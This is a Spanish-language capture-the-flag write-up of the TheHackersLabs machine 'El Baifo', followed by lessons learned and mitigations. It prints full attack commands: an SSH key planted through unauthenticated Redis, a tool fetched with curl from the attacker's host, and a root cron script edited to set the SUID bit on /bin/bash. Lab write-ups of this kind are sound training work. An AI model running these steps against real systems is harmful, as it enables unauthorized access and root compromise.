## Información General

| Campo                    | Detalle                                        |
| ------------------------ | ---------------------------------------------- |
| **Nombre de la máquina** | El Baifo                                       |
| **Plataforma**           | TheHackersLabs                                 |
| **Dificultad**           | Facil                                          |
| **Sistema Operativo**    | Linux (Debian)                                 |
| **Servicios expuestos**  | SSH (22), HTTP (80), MQTT (1883), Redis (6379) |

---

## Resumen del Ataque

La máquina expone un sitio web corporativo de una quesería artesanal (El Baifo), un broker MQTT que retransmite telemetría de collares de ganado, y una instancia de Redis sin autenticación. La suscripción al broker MQTT filtra el nombre de un usuario del sistema (`pastor01`) a través de mensajes operativos de "cambio de turno". Redis, accesible sin credenciales, permite escribir archivos arbitrarios en el sistema de ficheros mediante el abuso de `CONFIG SET dir` / `CONFIG SET dbfilename`, lo que se aprovecha para inyectar una clave pública SSH propia en `~/.ssh/authorized_keys` de `pastor01` y obtener acceso remoto. Una vez dentro, la enumeración de procesos con `pspy64` revela una tarea cron que ejecuta un script de backup como root; dicho script es editable por el grupo al que pertenece `pastor01`, lo que permite inyectar un comando que otorga el bit SUID a `/bin/bash`, resultando en escalada de privilegios a root.

---

## Técnicas Usadas

- Reconocimiento de puertos y servicios con Nmap
- Enumeración de contenido web y fuzzing de directorios (dirsearch)
- Suscripción y análisis de tópicos MQTT (`mosquitto_sub`) para filtrado de información sensible
- Explotación de Redis sin autenticación para escritura arbitraria de archivos (inyección de clave SSH vía `CONFIG SET dir` / `dbfilename`)
- Acceso inicial vía SSH con clave inyectada
- Enumeración de procesos en tiempo real con `pspy64`
- Escalada de privilegios por script de cron editable por grupo (permisos incorrectos)
- Abuso de bit SUID en `/bin/bash` para shell como root

---

## Desarrollo

### 1. Escaneo de puertos completo

```
sudo nmap -p- -sS --min-rate 5000 -n -vvv -Pn -oN ports 192.168.241.148
```

![[IMG-20260809133541450.png]]

### 2. Escaneo de versiones y scripts por defecto

```
nmap -p 22,80,1883,6379 -sC -sV -oN allports 192.168.241.148
```

Resultado relevante:

![[IMG-20260809133541549.png]]

El script `mqtt-subscribe` de Nmap ya adelanta información interesante, incluyendo un mensaje del tópico `baifo/sistemas/turno`:

```
baifo/sistemas/turno: Encargado de turno: Antonio (pastor01) — revisión de collares OK
```

![[IMG-20260809133541616.png]]

### 3. Enumeración web

Se accede a `http://192.168.241.148/` y se revisa el código fuente. Se trata de la web corporativa de una quesería, sin funcionalidad de backend evidente ni formularios explotables. No se encuentran credenciales ni comentarios sensibles en el HTML.

![[IMG-20260809133541672.png]]

### 4. Fuzzing de directorios

```
dirsearch -u http://192.168.241.148/ --exclude-status 403,404,500 -e php,txt,html
```

![[IMG-20260809133541724.png]]

Solo se descubre el directorio de recursos estáticos del sitio; no aporta vía de explotación (pista descartada).

### 5. Enumeración de Redis sin autenticación

```
redis-cli -h 192.168.241.148 -p 6379
192.168.241.148:6379> ping
PONG
192.168.241.148:6379> keys *
1) "clave"
```

Redis responde sin requerir autenticación. Solo existe una key residual (`clave`) sin valor útil directo para el acceso inicial.

### 6. Enumeración de MQTT para identificar usuarios

```
mosquitto_sub -h 192.168.241.148 -t 'baifo/sistemas/#' -v
```

![[IMG-20260809133541792.png]]

Se confirma el nombre de usuario del sistema: `pastor01`.

### 7. Inyección de clave SSH vía Redis

Se genera un par de claves propio:

```
ssh-keygen -t rsa -b 4096 -f redis_key -N ""
```

Se prepara el payload con el formato que espera `authorized_keys`:

```
(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > foo.txt
```

Se escribe la clave pública como valor de una key en Redis:

```
cat foo.txt | redis-cli -h 192.168.241.148 -x set ssh_key
```

Se reconfigura Redis para que el siguiente `SAVE` escriba el `.rdb` directamente como `authorized_keys` dentro del directorio `.ssh` de `pastor01`:

```
redis-cli -h 192.168.241.148 -p 6379

192.168.241.148:6379> config set dir /home/pastor01/.ssh

192.168.241.148:6379> config get dbfilename

192.168.241.148:6379> config set dbfilename authorized_keys

192.168.241.148:6379> save
```

### 8. Acceso SSH con la clave inyectada

```
chmod 600 redis_key
ssh -i redis_key pastor01@192.168.241.148
```

Acceso concedido como `pastor01`.

### 9. Captura de la flag de usuario

```
grep bash /etc/passwd
```

![[IMG-20260809133541846.png]]

```
cat user.txt
```

![[IMG-20260809133541900.png]]

### 10. Enumeración de procesos con pspy64

Se transfiere `pspy64` desde el equipo atacante:

```
# equipo atacante
python3 -m http.server 8000
```

```
# víctima
curl 192.168.241.128:8000/pspy64 -o pspy64
chmod +x pspy64
./pspy64
```

Se observa una tarea programada ejecutándose como root:

![[IMG-20260809133541941.png]]

### 11. Localización del vector de escalada

```
cd /opt/baifo
ls
```

![[IMG-20260809133541973.png]]

```
cd scripts
ls
```

![[IMG-20260809133542050.png]]

```
ls -la backup-collares.sh
```

![[IMG-20260809133542336.png]]

```
cat backup-collares.sh
```

![[IMG-20260809133542400.png]]

`pastor01` pertenece al grupo propietario del script y tiene permiso de escritura sobre él, mientras que el script se ejecuta periódicamente como root (confirmado con `pspy64`).

### 12. Escalada de privilegios

Se añade una línea al script para otorgar el bit SUID a bash:

```
echo 'chmod u+s /bin/bash' >> /opt/baifo/scripts/backup-collares.sh
```

Tras la siguiente ejecución del cron:

```
ls -l /bin/bash
```

![[IMG-20260809133542534.png]]

### 13. Shell como root

```
bash -p
whoami
```

![[IMG-20260809133542585.png]]

### 14. Captura de la flag de root

```
cd /root
cat root.txt
```

![[IMG-20260809133542636.png]]

---

## Lecciones Aprendidas

- Un servicio Redis sin autenticación no es solo un problema de "fuga de datos": permite escritura arbitraria de archivos en el sistema si el proceso corre con permisos de escritura sobre rutas sensibles del usuario.
- Los tópicos MQTT operativos (mensajes de "turno", logs de estado, etc.) pueden filtrar nombres de usuario reales del sistema sin que nadie lo perciba como un problema de seguridad.
- Un script con permisos `rwxrwx---` propiedad de `root:grupo_usuario` es efectivamente una puerta trasera si ese script se ejecuta con privilegios elevados vía cron: cualquier miembro del grupo puede modificarlo.
- Herramientas de monitorización de procesos en tiempo real (`pspy64`) son clave para descubrir tareas cron o procesos periódicos que no son visibles enumerando `/etc/cron*` directamente (si no se tiene permiso de lectura).

---

## Medidas de Mitigación

- Configurar `requirepass` en Redis (o restringir el acceso por firewall/bind a localhost) y nunca exponer el servicio directamente a redes no confiables.
- Ejecutar Redis con un usuario sin permisos de escritura sobre directorios de usuarios del sistema (evitar que pueda escribir en `/home/*/.ssh`).
- Revisar qué información se publica en tópicos MQTT operativos; evitar incluir nombres de usuario reales o cualquier dato que pueda mapearse a cuentas del sistema.
- Aplicar el principio de mínimo privilegio en scripts ejecutados por cron como root: deben pertenecer a root y no ser escribibles por ningún grupo de usuarios sin privilegios.
- Auditar periódicamente permisos de archivos y tareas cron con herramientas como `pspy` desde una perspectiva de "qué vería un atacante con acceso limitado".





